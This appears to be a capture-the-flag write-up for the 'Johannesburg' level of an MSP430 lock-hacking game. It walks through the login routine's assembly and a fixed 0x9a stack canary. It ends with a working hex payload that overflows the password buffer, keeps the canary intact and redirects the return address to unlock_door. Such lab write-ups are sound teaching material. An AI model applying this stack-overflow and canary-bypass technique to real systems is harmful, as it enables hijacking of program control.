# Johannesburg

**Date Completed:** 10/26/2025

Starting by looking at `<login>` we see:

```asm
452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 9a00 1100 mov.b	#0x9a, 0x11(sp)
```

The program is making room on the stack for 18 bytes (adding 0xffee is the same as subtracting 18), and then writing `0x9a` in the 17th byte relative to sp.

So we end up with a stack that looks like this:

```sh
> r sp
43ec 0000 0000 0000 0000 0000 0000 0000 0000  ................
43fc 009a 3c44 3140 0044 1542 5c01 75f3 35d0  ..<D1@.D.B\.u.5.
```

Upon seeing this my first though was: "Was is the relevance of `0x9a` in the program?". Looking a bit further ahead in `<login>` we see:

```asm
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	$+0xc <login+0x44>
...
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 9a00 1100 cmp.b	#0x9a, 0x11(sp)
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```

After the user enters the password `<test_password_valid>` is called to check if the password matches. If there is a match `r15` will be non-zero and the door is unlocked. If the password is not valid `r15` (the return value from test_password_valid) will be zero, we take the jump, print out that th password is not correct, and then check if the value `0x9a` is still in the stack. If the value `0x9a` is not in the stack, it's because the user input was too long and copied past its allocated buffer and the program jumps to `<__stop_progExec__>`. If the value `0x9a` is still in the stack the program calls the `ret` instruction.

My though here then is to blow past the 16-byte allocated buffer on the stack, make sure the value `0x9a` remains where it needs to be, and then overwrite the memory for the `ret` instruction to point to the `<unlock_door>` method (at memory address `0x4446`).

So we end up with something like this:
`a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5 + ff9a + 4644 + 00`

**Solution: in HEX `a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5ff9a464400`.**

```sh
> solve
a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5ff9a464400
```
